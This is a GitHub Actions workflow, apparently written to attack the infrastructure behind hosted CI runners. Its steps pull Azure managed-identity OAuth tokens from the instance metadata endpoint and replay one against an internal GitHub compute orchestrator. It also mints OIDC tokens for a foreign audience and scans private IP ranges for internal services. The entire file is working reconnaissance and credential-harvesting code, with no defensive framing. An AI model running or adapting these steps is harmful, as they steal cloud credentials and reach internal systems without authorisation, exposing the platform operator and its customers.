name: SSRF Test Enhanced
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  ssrf-enhanced:
    runs-on: ubuntu-latest
    steps:
      - name: Azure IMDS - Try Managed Identity
        run: |
          echo "=== Managed Identity Token ==="
          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" || echo "IMDS identity FAILED"
          echo ""
          echo "=== Managed Identity for Storage ==="
          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true" || echo "IMDS storage FAILED"
          echo ""
          echo "=== Managed Identity for ADO ==="
          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=499b84ac-1321-427f-aa17-267ca6975798" -H "Metadata: true" || echo "IMDS ADO FAILED"
      - name: Internal orchestrator access  
        run: |
          echo "=== hosted-compute-request-orchestrator ==="
          curl -s -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" || echo "Orchestrator FAILED"
          echo ""
          echo "=== Orchestrator with IMDS identity ==="
          IMDS_TOKEN=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" -H "Metadata: true" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token','NO_TOKEN'))" 2>/dev/null || echo "NO_TOKEN")
          echo "IMDS_TOKEN_PREFIX=${IMDS_TOKEN:0:30}..."
          if [ "$IMDS_TOKEN" != "NO_TOKEN" ]; then
            curl -s -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" -H "Authorization: Bearer $IMDS_TOKEN" | head -c 500
          fi
      - name: OIDC token for different audiences
        run: |
          echo "=== OIDC token for hosted-compute-ro ==="
          OIDC_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('value','NO_TOKEN')[:50])" 2>/dev/null || echo "OIDC_FAILED")
          echo "OIDC_TOKEN_PREFIX: $OIDC_TOKEN"
      - name: Look for internal services
        run: |
          echo "=== Internal network scan ==="
          for ip in 10.1.0.1 10.0.0.1 10.0.0.2 169.254.1.1; do
            curl -s -m 2 "http://$ip" -w "\n%{http_code} $ip\n" -o /dev/null 2>&1 || true
          done
